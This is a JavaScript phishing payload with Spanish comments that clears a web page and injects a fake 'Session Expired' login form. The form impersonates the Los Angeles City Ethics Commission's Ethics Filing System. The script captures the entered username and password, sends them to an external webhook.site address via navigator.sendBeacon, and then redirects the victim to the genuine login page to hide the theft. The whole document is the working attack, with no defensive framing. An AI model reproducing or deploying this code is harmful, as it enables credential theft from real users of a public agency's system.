(function() {
    // 1. Detener cualquier ejecución de JS restante y limpiar el DOM por completo
    window.stop(); 
    document.documentElement.innerHTML = ''; 

    // 2. Crear un nuevo body limpio para evitar conflictos de CSS previo
    const newBody = document.createElement('body');
    newBody.style.cssText = "margin:0; padding:0; background:#f4f7f9; font-family:'Helvetica Neue',Helvetica,Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; width:100vw;";
    
    // 3. Inyectar el HTML del Phishing con diseño profesional
    newBody.innerHTML = `
    <div style="width:380px; background:#fff; padding:40px; border-radius:4px; box-shadow:0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #0056b3; text-align:center;">
        <img src="https://ethics.lacity.gov/wp-content/uploads/2018/06/Logo_132x58.gif" style="width:100%; max-width:280px; margin-bottom:30px;">
        <h2 style="font-size:20px; color:#333; margin:0 0 10px 0;">Session Expired</h2>
        <p style="color:#666; font-size:14px; line-height:1.5; margin-bottom:25px;">For your security, please re-authenticate to continue in the <strong>Ethics Filing System (EFS)</strong>.</p>
        
        <div style="text-align:left;">
            <label style="font-size:12px; font-weight:bold; color:#555; text-transform:uppercase;">Username</label>
            <input id="u" type="text" style="width:100%; padding:12px; margin:8px 0 20px 0; border:1px solid #ccc; border-radius:3px; box-sizing:border-box; outline:none;">
            
            <label style="font-size:12px; font-weight:bold; color:#555; text-transform:uppercase;">Password</label>
            <input id="p" type="password" style="width:100%; padding:12px; margin:8px 0 25px 0; border:1px solid #ccc; border-radius:3px; box-sizing:border-box; outline:none;">
        </div>

        <button id="go" style="width:100%; padding:14px; background:#0056b3; color:#fff; border:none; border-radius:3px; font-size:16px; font-weight:bold; cursor:pointer; transition:background 0.2s;">Sign In</button>
        
        <p style="margin-top:20px; font-size:12px; color:#999;">&copy; 2026 Los Angeles City Ethics Commission</p>
    </div>`;

    document.documentElement.appendChild(newBody);

    // 4. Lógica de captura mejorada
    document.getElementById('go').onclick = function() {
        this.innerHTML = "Processing...";
        this.style.opacity = "0.7";
        
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        
        // Exfiltración vía Beacon (más fiable al redirigir)
        const data = new FormData();
        data.append('user', u);
        data.append('pass', p);
        data.append('origin', 'ethics_lacity_login');
        
        navigator.sendBeacon('https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91', data);
        
        // Redirección suave
        setTimeout(() => {
            window.location.replace('https://ethics.lacity.gov/efs/index.cfm?fuseaction=login');
        }, 800);
    };
})();
